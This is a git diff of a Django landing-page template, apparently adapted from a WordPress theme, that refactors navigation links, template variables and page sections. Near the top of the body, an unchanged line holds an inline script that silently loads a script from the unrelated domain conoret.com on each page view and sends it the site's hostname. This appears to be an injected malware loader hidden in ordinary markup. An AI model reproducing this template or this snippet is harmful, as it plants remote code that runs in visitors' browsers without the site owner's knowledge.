@@ -5,8 +5,9 @@
    <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1">
-      <title>{{ Display_1.headers.Заголовок_страницы }}</title>
+      <title>{{ page.title }}</title>
       <meta name="robots" content="noindex, nofollow">
+      <meta name="description" content=">{{ page.description }}">
       <link rel="dns-prefetch" href="//use.typekit.net">
       <link rel="dns-prefetch" href="//fonts.googleapis.com">
       <link rel="stylesheet" id="bootstrap-css" href="{% static 'css/bootstrap.min.css' %}" media="all">
@@ -38,7 +39,7 @@
    </head>
    <body class="home page-template-default page page-id-2 page-parent wpb-js-composer js-comp-ver-7.0 vc_responsive">
       <script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
-      <nav class="navbar navbar-default navbar-fixed-top">
+      <nav class="navbar navbar-default navbar-fixed-top navbar-shrink">
          <div class="container">
             <div id="logo"> <a class="logo" href="{% url 'main:index' %}">{{ Display_1.links.Логотип.text }}</a></div>
             <div class="navbar-header page-scroll">
@@ -53,15 +54,15 @@
                               display: none !important;
                            }
                         </style>
-                     <a title="{{ Display_1.links.Первая_кнопка_меню.title }}" href="{{ Display_1.links.Первая_кнопка_меню.href }}" >
+                     <a title="{{ Display_1.links.Первая_кнопка_меню.title }}" href="{% url 'main:index' %}#{{ Display_1.links.Первая_кнопка_меню.href }}" >
                         {{ Display_1.links.Первая_кнопка_меню.text }}
                      </a>
                   </li>
-                  <li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1997" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{{ Display_1.links.Вторая_кнопка_меню.href }}">{{ Display_1.links.Вторая_кнопка_меню.text }}</a></li>
-                  <li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1998" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{{ Display_1.links.Третья_кнопка_меню.href }}">{{ Display_1.links.Третья_кнопка_меню.text }}</a></li>
-                  <li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1999" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{{ Display_1.links.Четвертая_кнопка_меню.href }}">{{ Display_1.links.Четвертая_кнопка_меню.text }}</a></li>
-                  <li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-2000" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{{ Display_1.links.Пятая_кнопка_меню.href }}">{{ Display_1.links.Пятая_кнопка_меню.text }}</a></li>
-                  <li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-2001" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{{ Display_1.links.Шестая_кнопка_меню.href }}">{{ Display_1.links.Шестая_кнопка_меню.text }}</a></li>
+                  <li itemscope="itemscope" id="menu-item-1997" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{% url 'main:index' %}#{{ Display_1.links.Вторая_кнопка_меню.href }}">{{ Display_1.links.Вторая_кнопка_меню.text }}</a></li>
+                  <li itemscope="itemscope" id="menu-item-1998" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{% url 'main:index' %}#{{ Display_1.links.Третья_кнопка_меню.href }}">{{ Display_1.links.Третья_кнопка_меню.text }}</a></li>
+                  <li itemscope="itemscope" id="menu-item-1999" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{% url 'main:index' %}#{{ Display_1.links.Четвертая_кнопка_меню.href }}">{{ Display_1.links.Четвертая_кнопка_меню.text }}</a></li>
+                  <li itemscope="itemscope" id="menu-item-2000" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{% url 'main:index' %}#{{ Display_1.links.Пятая_кнопка_меню.href }}">{{ Display_1.links.Пятая_кнопка_меню.text }}</a></li>
+                  <li itemscope="itemscope" id="menu-item-2001" class="menu-item menu-item-type-post_type menu-item-object-page one-page-link"><a title="{{ Display_1.links.Вторая_кнопка_меню.title }}" href="{% url 'main:index' %}#{{ Display_1.links.Шестая_кнопка_меню.href }}">{{ Display_1.links.Шестая_кнопка_меню.text }}</a></li>
                </ul>
                <div class="header-search-bar">
                   <span class="toggle-search fa-search fa"></span>
@@ -76,128 +77,12 @@
          </div>
       </nav>
       <div id="wrapper" class="">
-         <section id="our-story" class="section" style="padding-bottom:0px;">
-            <div class="container fullwidth">
-               <div class="row"></div>
-               <div class="row">
-                  <section class="wpb-content-wrapper">
-                     <div class="vc_row wpb_row vc_row-fluid">
-                        <div class="wpb_column vc_column_container vc_col-sm-1 vc_col-lg-6 vc_col-md-12 vc_col-xs-12">
-                           <div class="vc_column-inner vc_custom_1488288711333">
-                              <div class="wpb_wrapper">
-                                 <div class="wpb_single_image wpb_content_element vc_align_left  vc_custom_1487429625432">
-                                    <figure class="wpb_wrapper vc_figure">
-                                       <div class="vc_single_image-wrapper   vc_box_border_grey"><img width="888" height="770" src="{{ Display_3.images.Задний_фон.media_image.url }}" class="vc_single_image-img attachment-full" alt="{{ Display_3.images.Задний_фон.alt }}" decoding="async" title="{{ Display_3.images.Задний_фон.title }}" loading="lazy" sizes="(max-width: 888px) 100vw, 888px"></div>
-                                    </figure>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                        <div class="wpb_column vc_column_container vc_col-sm-1">
-                           <div class="vc_column-inner vc_custom_1487429454313">
-                              <div class="wpb_wrapper"></div>
-                           </div>
-                        </div>
-                        <div class="wpb_column vc_column_container vc_col-sm-1 vc_col-lg-3 vc_col-md-12 vc_col-xs-12">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper">
-                                 <h2 style="text-align: left" class="vc_custom_heading vc_custom_1487705040767">{{ Display_3.headers.Заголовок_третьего_экрана }}</h2>
-                                 <div class="vc_empty_space" style="height: 25px"><span class="vc_empty_space_inner"></span></div>
-                                 <div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_10 vc_sep_border_width_2 vc_sep_pos_align_left vc_separator_no_text"><span class="vc_sep_holder vc_sep_holder_l"><span style="border-color:#31d093;" class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span style="border-color:#31d093;" class="vc_sep_line"></span></span></div>
-                                 <div class="wpb_text_column wpb_content_element " style="margin-bottom: 0">
-                                    <div class="wpb_wrapper">
-                                          <style>
-                                              .descr-div {
-                                                 padding: 0 !important;
-                                              }
-                                              .descr-div h4 {
-                                                  margin-top: 30px !important;
-                                                  margin-bottom: 30px;
-                                              }
-                                          </style>
-                                          <div class="key-icon-box icon-default icon-top cont-left kd-animated fadeInUp kd-animate descr-div" style="background-color: transparent;" data-animation-delay="200" >
-                                             <i class=" fa" style=" "></i>
-                                             {{ Display_3.texts.Текст_третьего_экрана|safe }}
-                                          </div>
-                                    </div>
-                                 </div>
-                                 <div class="vc_row wpb_row vc_inner vc_row-fluid vc_custom_1486465166412">
-                                    {% if Display_3.buttons.Кнопка.visible %}
-                                    <div class="wpb_column vc_column_container vc_col-sm-12">
-                                       <div class="vc_column-inner vc_custom_1486465283494">
-                                          <div class="wpb_wrapper">
-                                             <div class="vc_empty_space" style="height: 55px"><span class="vc_empty_space_inner"></span></div>
-                                             {% if not Display_3.buttons.Кнопка.add_form %}
-                                             <a style="width:px" href="{{ Display_3.buttons.Кнопка.href }}" target="_self" title="{{ Display_3.buttons.Кнопка.title }}" class="tt_button tt_secondary_button pull-left kd-animated zoomIn kd-animate" data-animation-delay="200"><span class="prim_text">{{ Display_3.buttons.Кнопка.text }}</span></a>
-                                             {% else %}
-                                             <button style="width:px" href="{{ Display_3.buttons.Кнопка.href }}" data-toggle="modal" target="_self" title="{{ Display_3.buttons.Кнопка.title }}" class="tt_button tt_secondary_button pull-left kd-animated zoomIn kd-animate" data-animation-delay="200" {% if Display_8.buttons.Кнопка.add_form %}data-target="#exampleModal" {% endif %}data-whatever="@getbootstrap"><span class="prim_text">{{ Display_3.buttons.Кнопка.text }}</span></button>
-                                             {% endif %}
-                                          </div>
-                                       </div>
-                                    </div>
-                                    {% endif %}
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                        <div class="wpb_column vc_column_container vc_col-sm-2">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper"></div>
-                           </div>
-                        </div>
-                     </div>
-                  </section>
-               </div>
-            </div>
-         </section>
-         <section id="get-better-results" class="section" style="background-color:#f8f8f8;">
-            <div class="container ">
-               <div class="row"></div>
-               <div class="row">
-                  <section class="wpb-content-wrapper">
-                     <div class="vc_row wpb_row vc_row-fluid vc_custom_1486647104804">
-                        <div class="wpb_column vc_column_container vc_col-sm-6 vc_col-lg-6 vc_col-md-12 vc_col-xs-12">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper">
-                                 <div class="vc_row wpb_row vc_inner vc_row-fluid">
-                                    <div class="wpb_column vc_column_container vc_col-sm-8">
-                                       <div class="vc_column-inner vc_custom_1486561683026">
-                                          <div class="wpb_wrapper">
-                                             <div class="vc_empty_space" style="height: 40px"><span class="vc_empty_space_inner"></span></div>
-                                             <h2 style="text-align: left" class="vc_custom_heading">{{ Display_4.headers.Заголовок_четвертого_экрана }}</h2>
-                                             <div class="vc_empty_space" style="height: 25px"><span class="vc_empty_space_inner"></span></div>
-                                             <div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_10 vc_sep_border_width_2 vc_sep_pos_align_left vc_separator_no_text"><span class="vc_sep_holder vc_sep_holder_l"><span style="border-color:#31d093;" class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span style="border-color:#31d093;" class="vc_sep_line"></span></span></div>
-                                             <p style="font-size: 18px;line-height: 1.4;text-align: left" class="vc_custom_heading">{{ Display_4.texts.Текст_четвертого_экрана | safe}}</p>
-                                          </div>
-                                       </div>
-                                    </div>
-                                    <div class="wpb_column vc_column_container vc_col-sm-4">
-                                       <div class="vc_column-inner">
-                                          <div class="wpb_wrapper"></div>
-                                       </div>
-                                    </div>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                        <div class="wpb_column vc_column_container vc_col-sm-6 vc_col-lg-6 vc_col-md-12 vc_col-xs-12">
-                           <div class="vc_column-inner vc_custom_1488288813991">
-                              <div class="wpb_wrapper">
-                                 <div class="video-container "><img width="620" height="380" src="{{ Display_4.images.Превью_видео.media_image.url }}" class="attachment-full" alt="{{ Display_4.images.Превью_видео.alt }}" decoding="async" title="{{ Display_4.images.Превью_видео.title }}" loading="lazy" srcset="https://www.keydesign-themes.com/intact/landing-page/wp-content/uploads/sites/7/2017/02/video-1.jpg 620w, https://www.keydesign-themes.com/intact/landing-page/wp-content/uploads/sites/7/2017/02/video-1-300x184.jpg 300w" sizes="(max-width: 620px) 100vw, 620px"><a data-toggle="modal" data-target="#video-modal-64e534f96b3b7" data-backdrop="true"><span class="play-video kd-animate"><span class="fa fa-play" style="font-weight: bold"></span></span></a></div>
-                              </div>
-                           </div>
-                        </div>
-                     </div>
-                  </section>
-               </div>
-            </div>
-         </section>
          <section id="1916" class="section">
             <div class="container ">
                <div class="row">
-                  <h2 class="section-heading">{{ Display_5.headers.Заголовок }}</h2>
+                  <h2 class="section-heading">{{ page.title }}</h2>
                   <span class="heading-separator"></span>
-                  <p class="section-subheading">{{ Display_5.texts.Главный_текст | safe }}</p>
+                  <p class="section-subheading">{{ page.description }}</p>
                </div>
                <div class="row">
                   <section class="wpb-content-wrapper">
@@ -220,16 +105,16 @@
                            <div class="vc_column-inner">
                               <div class="wpb_wrapper">
                                  <div class="kd-promobox prb_image_left kd-animated fadeInLeft kd-animate">
-                                    <div class="prb-img"><img width="400" height="267" src="{{ Display_5.images.Первая_картинка.media_image.url }}" class="attachment-full" alt="{{ Display_5.images.Первая_картинка.alt }}" decoding="async" title="{{ Display_5.images.Первая_картинка.title }}" loading="lazy"></div>
+                                    <div class="prb-img"><img width="400" height="267" src="{{ page.media_image.url }}" class="attachment-full" alt="#" decoding="async" title="#" loading="lazy"></div>
                                     <div class="prb-content">
-                                       <h3>Strategy</h3>
-                                       <p>{{ Display_5.texts.Второй_текст | safe}}</p>
-                                       <div class="prb-btncontainer"> <a href="#" title="" class="prb-button tt_secondary_button tt_button">Read more</a></div>
+                                       <h3>{{ page.header }}</h3>
+                                       <p>{{ page.text | safe}}</p>
+                                       {% comment %} <div class="prb-btncontainer"> <a href="#" title="" class="prb-button tt_secondary_button tt_button">Read more</a></div> {% endcomment %}
                                     </div>
                                  </div>
-                                 <div class="kd-divider solid_line divider_full_width thin_solid">
+                                 {% comment %} <div class="kd-divider solid_line divider_full_width thin_solid">
                                     <div class="divider-line" style="border-color:#e2e2e3"></div>
-                                 </div>
+                                 </div> {% endcomment %}
                               </div>
                            </div>
                         </div>
@@ -238,131 +123,6 @@
                               <div class="wpb_wrapper"></div>
                            </div>
                         </div>
-                     </div>
-                     <div class="vc_row wpb_row vc_row-fluid">
-                        <div class="wpb_column vc_column_container vc_col-sm-1">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper"></div>
-                           </div>
-                        </div>
-                        <div class="wpb_column vc_column_container vc_col-sm-10">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper">
-                                 <div class="kd-promobox prb_image_right kd-animated fadeInLeft kd-animate">
-                                    <div class="prb-img"><img width="400" height="267" src="{{ Display_5.images.Вторая_картинка.media_image.url }}" class="attachment-full" alt="{{ Display_5.images.Вторая_картинка.alt }}" decoding="async" title="{{ Display_5.images.Вторая_картинка.title }}" loading="lazy" ></div>
-                                    <div class="prb-content">
-                                       <h3>Planning</h3>
-                                       <p>{{ Display_5.texts.Второй_текст | safe }}</p>
-                                       <div class="prb-btncontainer"> <a href="#" title="" class="prb-button tt_secondary_button tt_button">Read more</a></div>
-                                    </div>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                        <div class="wpb_column vc_column_container vc_col-sm-1">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper"></div>
-                           </div>
-                        </div>
-                     </div>
-                  </section>
-               </div>
-            </div>
-         </section>
-         <section id="pricing-options" class="section parallax with-overlay" style="background-color:#1f1f1f;padding-bottom:240px;">
-            <div class="parallax-overlay" style="background-image: url(&quot;https://www.keydesign-themes.com/intact/landing-page/wp-content/uploads/sites/7/2017/02/parallax-4.jpg&quot;); transform: translate3d(0px, -1781.13px, 0px);"></div>
-            <div class="container ">
-               <div class="row">
-                  <h2 class="section-heading">{{ Display_6.headers.Заголовок }}</h2>
-                  <span class="heading-separator"></span>
-                  <p class="section-subheading">{{ Display_6.texts.Текст_заголовка | safe }}</p>
-               </div>
-               <div class="row">
-                  <section class="wpb-content-wrapper">
-                     <div class="vc_row wpb_row vc_row-fluid">
-                        <div class="wpb_column vc_column_container vc_col-sm-4">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper">
-                                 <div class="key-icon-box icon-default icon-top cont-left kd-animated fadeInUp kd-animate" style="background-color: transparent;">
-                                    <i class=" fa" style=" "></i>
-                                    <h4 class="service-heading" style="color: #ffffff;">{{ Display_6.headers.Первый_подзаголовок }}</h4>
-                                    <p style="color: #ffffff;">{{ Display_6.texts.Текст_первого_подзаголовка | safe }}</p>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                        <div class="wpb_column vc_column_container vc_col-sm-4">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper">
-                                 <div class="key-icon-box icon-default icon-top cont-left kd-animated fadeInUp kd-animate" style="background-color: transparent;" data-animation-delay="200">
-                                    <i class=" fa" style=" "></i>
-                                    <h4 class="service-heading" style="color: #ffffff;">{{ Display_6.headers.Второй_подзаголовок }}</h4>
-                                    <p style="color: #ffffff;">{{ Display_6.texts.Текст_второго_подзаголовка | safe }}</p>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                        <div class="wpb_column vc_column_container vc_col-sm-4">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper">
-                                 <div class="key-icon-box icon-default icon-top cont-left kd-animated fadeInUp kd-animate" style="background-color: transparent;" data-animation-delay="400">
-                                    <i class=" fa" style=" "></i>
-                                    <h4 class="service-heading" style="color: #ffffff;">{{ Display_6.headers.Третий_подзаголовок }}</h4>
-                                    <p style="color: #ffffff;">{{ Display_6.texts.Текст_третьего_подзаголовка | safe }}</p>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                     </div>
-                  </section>
-               </div>
-            </div>
-         </section>
-         <section id="pricing-plans" class="section" style="background-color:#f8f8f8;padding-top:0px;padding-bottom:75px;">
-            <div class="container ">
-               <div class="row"></div>
-               <div class="row">
-                  <section class="wpb-content-wrapper">
-                     <div class="vc_row wpb_row vc_row-fluid vc_custom_1487430325564">
-                     {% for card in cards %}
-                        {% if card.visible %}
-                        <div class="wpb_column vc_column_container vc_col-sm-4">
-                           <div class="vc_column-inner">
-                              <div class="wpb_wrapper">
-                                 <div class="pricing-table active  ">
-                                    <div class="row pricing-title">
-                                       <div class="row pricing-title-content">{{ card.title }}</div>
-                                       <div class="other-text">{{ card.subtitle }}</div>
-                                    </div>
-                                    <div class="row pricing">
-                                       <div class="col-lg-3 col-md-3 col-sm-3">
-                                          <div class="row">
-                                             <div class="pricing-img"></div>
-                                             <span class="pricing-price"><span class="currency"></span>{{ card.price }}</span>
-                                          </div>
-                                       </div>
-                                       <div class="pricing-meta"> <span class="pricing-time"></span></div>
-                                       <div class="pricing-options-container">
-                                          <div class="pricing-row"><span class="pricing-value"><span class="pricing-option"><i class="fa fa-check"></i>Unlimited databases</span></span></div>
-<!--                                          <div class="pricing-row"><span class="pricing-value"><span class="pricing-option"><i class="fa fa-check"></i>Unlimited websites</span></span></div>-->
-<!--                                          <div class="pricing-row"><span class="pricing-value"><span class="pricing-option"><i class="fa fa-check"></i>CMS Navigation</span></span></div>-->
-<!--                                          <div class="pricing-row"><span class="pricing-value"><span class="pricing-option"><i class="fa fa-check"></i>Free updates</span></span></div>-->
-<!--                                          <div class="pricing-row"><span class="pricing-value"><span class="pricing-option"><i class="fa fa-check"></i>Priority support</span></span></div>-->
-
-                                          {% for row in card.descr %}
-                                             <div class="pricing-row"><span class="pricing-value"><span class="pricing-option"><i class="fa fa-check"></i>{{ row }}</span></span></div>
-                                          {% endfor %}
-                                       </div>
-                                       <a href="{{ card.href }}" class="tt_button kd-animated zoomIn kd-animate" data-animation-delay="400">Choose plan</a>
-                                    </div>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                        {% endif %}
-                     {% endfor %}
-
-
                      </div>
                   </section>
                </div>
@@ -500,15 +260,6 @@
          window.open(self.location.href, '_top');
          }
       </script>
-<!--      <div id="customizer" class="hidden-xs">-->
-<!--         <div class="options"> <a class="custom-tooltip switcher fa nc-icon-outline-laptop"><span class="intact-tooltip">Demo Switcher <span class="trialngle-tooltip"></span></span></a> <a class="custom-tooltip" href="https://keydesign.ticksy.com/" target="_blank"><i class="fa nc-icon-outline-chat"></i><span class="intact-tooltip">Customer Support<span class="trialngle-tooltip"></span></span></a> <a class="custom-tooltip" href="https://www.keydesign-themes.com/intact/documentation/" target="_blank"><i class="fa nc-icon-outline-print"></i><span class="intact-tooltip">Documentation<span class="trialngle-tooltip"></span></span></a> <a class="custom-tooltip" href="https://1.envato.market/MV5oo" target="_blank"><i class="fa nc-icon-outline-cart"></i><span class="intact-tooltip">Purchase Intact<span class="trialngle-tooltip"></span></span></a></div>-->
-<!--         <div id="demoselect">-->
-<!--            <div class="customizer-logo">Intact</div>-->
-<!--            <p>Check our well designed demos for startups and mobile apps and install them with only one click.</p>-->
-<!--            <div class="screenshot"> <a href="https://www.keydesign-themes.com/intact/creative-agency/" class="first"><span>Creative Agency</span><img src="https://www.keydesign-themes.com/intact/images/demo1.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/startup/" class="first"><span>Startup Demo</span><img src="https://www.keydesign-themes.com/intact/images/demo2.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/business/" class="first"><span>Business Demo</span><img src="https://www.keydesign-themes.com/intact/images/demo3.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/digital-product/" class="first"><span>Digital Product</span><img src="https://www.keydesign-themes.com/intact/images/demo4.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/marketing-agency/" class="first"><span>Marketing Agency</span><img src="https://www.keydesign-themes.com/intact/images/demo5.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/landing-page/" class="first"><span>Landing Page</span><img src="https://www.keydesign-themes.com/intact/images/demo6.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/conference/" class="first"><span>Conference Demo</span><img src="https://www.keydesign-themes.com/intact/images/demo7.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/shop-classic/" class="first"><span>Shop Classic</span><img src="https://www.keydesign-themes.com/intact/images/demo8.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/mobile-app/" class="first"><span>Mobile App Demo</span><img src="https://www.keydesign-themes.com/intact/images/demo9.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/corporate/" class="first"><span>Corporate Demo</span><img src="https://www.keydesign-themes.com/intact/images/demo10.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/simple-portfolio/" class="first"><span>Simple Portfolio</span><img src="https://www.keydesign-themes.com/intact/images/demo11.jpg" alt=""></a> <a href="https://www.keydesign-themes.com/intact/coming-soon/" class="first"><span>Coming Soon</span><img src="https://www.keydesign-themes.com/intact/images/demo12.jpg" alt=""></a></div>-->
-<!--         </div>-->
-<!--         <a href="https://1.envato.market/MV5oo" class="tt_button" target="_blank"><span class="prim_text">Purchase Intact</span></a>-->
-<!--      </div>-->
       <script> window.RS_MODULES = window.RS_MODULES || {};
          window.RS_MODULES.modules = window.RS_MODULES.modules || {};
          window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
@@ -516,166 +267,25 @@
          window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
          window.RS_MODULES.type = 'compiled';
       </script>
-      {% comment %} <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-         <div class="pswp__bg"></div>
-         <div class="pswp__scroll-wrap">
-            <div class="pswp__container">
-               <div class="pswp__item"></div>
-               <div class="pswp__item"></div>
-               <div class="pswp__item"></div>
-            </div>
-            <div class="pswp__ui pswp__ui--hidden">
-               <div class="pswp__top-bar">
-                  <div class="pswp__counter"></div>
-                  <button class="pswp__button pswp__button--close" title="Close (Esc)"></button> <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button> <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                  <div class="pswp__preloader">
-                     <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                           <div class="pswp__preloader__donut"></div>
-                        </div>
-                     </div>
-                  </div>
-               </div>
-               <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"> </button> <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"> </button>
-               <div class="pswp__caption">
-                  <div class="pswp__caption__center"></div>
-               </div>
-            </div>
-         </div>
-      </div> {% endcomment %}
       <link rel="stylesheet" id="js_composer_front-css" href="{% static 'css/js_composer.min.css' %}" media="all">
       <link rel="stylesheet" id="kd_iconsmind-css" href="{% static 'css/iconsmind.min.css' %}" media="all">
       <link rel="stylesheet" id="rs-plugin-settings-css" href="{% static 'css/rs6.css' %}" media="all">
       <style id="rs-plugin-settings-inline-css"> #rs-demo-id {} </style>
-      <script src="{% static 'js/swv.min.js' %}" id="swv-js"></script>
-     <script id="contact-form-7-js-extra"> var wpcf7 = {"api":{"root":"https:\/\/www.keydesign-themes.com\/intact\/landing-page\/wp-json\/","namespace":"contact-form-7\/v1"}}; </script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/uploads/sites/7/siteground-optimizer-assets/contact-form-7.min.js" id="contact-form-7-js"></script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/revslider/public/assets/js/rbtools.min.js" defer="" async="" id="tp-tools-js"></script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/revslider/public/assets/js/rs6.min.js" defer="" async="" id="revmin-js"></script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/themes/intact/core/assets/js/bootstrap.min.js" id="bootstrapjs-js"></script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-includes/js/imagesloaded.min.js" id="imagesloaded-js"></script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-includes/js/masonry.min.js" id="masonry-js"></script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/keydesign-addon/assets/js/photoswipe.min.js" id="photoswipejs-js"></script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/keydesign-addon/assets/js/photoswipe-ui-default.min.js" id="photoswipejs-ui-js"></script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/uploads/sites/7/siteground-optimizer-assets/intact-scripts.min.js" id="intact-scripts-js"></script> <script src="//use.typekit.net/tzw4gjp.js?ver=4.0" id="intact-typekit-js"></script> <script id="intact-typekit-js-after"> try{Typekit.load({ async: true });}catch(e){} </script> <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js" id="wpb_composer_front_js-js"></script> <script></script>
+    <script src="{% static 'js/swv.min.js' %}" id="swv-js"></script>
+    <script id="contact-form-7-js-extra"> var wpcf7 = {"api":{"root":"https:\/\/www.keydesign-themes.com\/intact\/landing-page\/wp-json\/","namespace":"contact-form-7\/v1"}}; </script>
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/uploads/sites/7/siteground-optimizer-assets/contact-form-7.min.js" id="contact-form-7-js"></script> 
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/revslider/public/assets/js/rbtools.min.js" defer="" async="" id="tp-tools-js"></script> 
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/revslider/public/assets/js/rs6.min.js" defer="" async="" id="revmin-js"></script> 
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/themes/intact/core/assets/js/bootstrap.min.js" id="bootstrapjs-js"></script> 
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-includes/js/imagesloaded.min.js" id="imagesloaded-js"></script> 
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-includes/js/masonry.min.js" id="masonry-js"></script> 
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/keydesign-addon/assets/js/photoswipe.min.js" id="photoswipejs-js"></script> 
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/keydesign-addon/assets/js/photoswipe-ui-default.min.js" id="photoswipejs-ui-js"></script> 
+    {% comment %} <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/uploads/sites/7/siteground-optimizer-assets/intact-scripts.min.js" id="intact-scripts-js"></script>  {% endcomment %}
+    <script src="//use.typekit.net/tzw4gjp.js?ver=4.0" id="intact-typekit-js"></script> <script id="intact-typekit-js-after"> try{Typekit.load({ async: true });}catch(e){} </script> 
+    <script src="https://www.keydesign-themes.com/intact/landing-page/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js" id="wpb_composer_front_js-js"></script> <script></script>
 
-      <script>
-         {% comment %} $('#form_2').submit(function() {
-
-            // submission stuff
-            console.log('-____________________________________')
-            
-            return false;
-         }); {% endcomment %}
-         function handleSubmit(event) {
-            event.preventDefault();
-            const form = event.target;
-            const inputElementName = document.querySelector('input[name="your-name"]').value;
-            const inputElementEmail = document.querySelector('input[name="your-email"]').value;
-
-            // Получить значение поля ввода
-            // const inputValue = inputElement.value;
-
-            console.log(inputElementName, inputElementEmail);
-            const formData = new FormData(form);
-
-
-            console.log('Данные формы:', formData);
-
-            function getCookie(name) {
-                const value = `; ${document.cookie}`;
-                const parts = value.split(`; ${name}=`);
-                if (parts.length === 2) return parts.pop().split(';').shift();
-            }
-            const csrfToken = getCookie('csrftoken');
-
-            const data = {
-                name: inputElementName,
-                email: inputElementEmail
-            };
-
-            // Опции для POST-запроса
-            const options = {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json', // Установите нужный заголовок для типа данных
-                    'X-CSRFToken': csrfToken
-                },
-                body: JSON.stringify(data) // Преобразование объекта в JSON
-            };
-            console.log(options)
-
-            // Отправляем POST-запрос с помощью fetch
-            fetch({% url 'main:form' %}, options)
-                .then(response => response.json()) // Обрабатываем полученный JSON-ответ
-                .then(data => {
-                    console.log('Ответ:', data);
-                })
-                .catch(error => {
-                    console.error('Ошибка:', error);
-                });
-
-         }
-
-         function handleSubmit2(event) {
-            event.preventDefault()
-            const form = event.target;
-            const inputElementCountry = document.querySelector('input[name="country"]').value;
-            const inputElementCity = document.querySelector('input[name="city"]').value;
-            const inputElementName = document.querySelector('input[name="name"]').value;
-            const inputElementEmail = document.querySelector('input[name="email"]').value;
-
-
-            // Получить значение поля ввода
-            // const inputValue = inputElement.value;
-
-            console.log(inputElementName, inputElementEmail);
